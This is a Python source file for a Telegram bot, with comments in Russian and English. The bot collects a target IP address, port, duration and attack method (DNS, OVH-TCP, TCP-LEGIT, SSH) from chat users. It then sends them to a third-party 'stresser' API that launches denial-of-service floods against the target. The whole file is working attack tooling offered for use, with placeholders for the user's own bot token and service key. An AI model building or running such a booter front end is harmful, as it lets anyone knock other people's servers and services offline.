import telebot
from telebot import types
import requests
import re  
import json

tgbotapi = '11111111:111fff11-11111ffff1111'  # заменишь на свой ключ тг бота | replace the bot's tg key with your tg key
SITE_API_KEY = 'urapikey'  # апи ключ от мао | api key of mao

bot = telebot.TeleBot(tgbotapi)
user_data = {}
ip_pattern = re.compile(r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Привет! Для запуска атаки, напишите /attack")

# Команда /attack, которая запрашивает IP и Port | The /attack command, which requests an IP and Port
@bot.message_handler(commands=['attack'])
def attack(message):
    bot.send_message(message.chat.id, "Введите IP:")
    bot.register_next_step_handler(message, get_ip)

# Получаем IP от пользователя с валидацией | Get IP from user with validation
def get_ip(message):
    ip = message.text

    if re.match(ip_pattern, ip):
        user_data[message.chat.id] = {'ip': ip}
        bot.send_message(message.chat.id, "Введите порт:")
        bot.register_next_step_handler(message, get_port)
    else:
        bot.send_message(message.chat.id, "Некорректный IP-адрес. Введите правильный IP, например, 1.1.1.1:")
        bot.register_next_step_handler(message, get_ip)

# Получаем порт от пользователя | Get the port from the user
def get_port(message):
    port = message.text
    if port.isdigit():
        user_data[message.chat.id]['port'] = int(port)
        bot.send_message(message.chat.id, "Введите время атаки (от 15 до 120 секунд):")
        bot.register_next_step_handler(message, get_time)
    else:
        bot.send_message(message.chat.id, "Некорректный порт. Попробуйте снова:")
        bot.register_next_step_handler(message, get_port)

# Получаем время атаки от пользователя | Get the attack time from the user
def get_time(message):
    time = message.text
    if time.isdigit() and 15 <= int(time) <= 120:
        user_data[message.chat.id]['time'] = int(time)
        send_method_selection(message)
    else:
        bot.send_message(message.chat.id, "Некорректное время. Введите значение от 15 до 120 секунд:")
        bot.register_next_step_handler(message, get_time)

# Отправляем кнопки для выбора метода атаки | Send buttons to select the method of attack
def send_method_selection(message):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add('DNS', 'OVH-TCP', 'TCP-LEGIT', 'SSH')
    bot.send_message(message.chat.id, "Выберите метод атаки:", reply_markup=markup)
    bot.register_next_step_handler(message, get_method)

# Получаем метод атаки от пользователя | Getting the attack method from the user
def get_method(message):
    method = message.text
    if method in ['DNS', 'OVH-TCP', 'TCP-LEGIT', 'SSH']:
        user_data[message.chat.id]['method'] = method
        confirm_attack(message)
    else:
        bot.send_message(message.chat.id, "Некорректный метод. Попробуйте снова:")
        send_method_selection(message)

# Подтверждение атаки и запуск | Confirming the attack and launching
def confirm_attack(message):
    data = user_data[message.chat.id]
    bot.send_message(message.chat.id, f"IP: {data['ip']}\nПорт: {data['port']}\nВремя: {data['time']} сек\nМетод: {data['method']}")
    bot.send_message(message.chat.id, "Запускаю атаку...")
    start_attack(message)

# Функция для запуска атаки | Function for launching an attack
def start_attack(message):
    data = user_data[message.chat.id]
    url = 'https://mao-stress.de/api/start.php'

    headers = {
        'Accept': 'application/json'
    }

    params = {
        'user': 6163,
        'api_key': SITE_API_KEY,
        'target': data['ip'],
        'port': data['port'],
        'duration': data['time'],
        'method': data['method']
    }

    response = requests.get(url, params=params, headers=headers)

    if response.status_code == 200:
        response_data = response.json()

        if response_data.get("status") == "Error":
            if response_data.get("message") == "No server is available or online at the moment, please renew your request within minutes." or response_data.get("message") == "No server is available or online at the moment, please renew your request within minutes.":
                bot.send_message(message.chat.id, "Все сервера заняты, попробуйте запустить атаку чутка позже.") 
            else:
                bot.send_message(message.chat.id, "Произошла неизвестная ошибка при запуске атаки, овтет от сервера: " + json.dumps(response_data, indent=4)) 
        else:
            bot.send_message(message.chat.id, "DNS атака успешно запущена!")
    else:
        bot.send_message(message.chat.id, "Ошибка при запуске атаки, лог отправлен в консоль")

bot.polling()
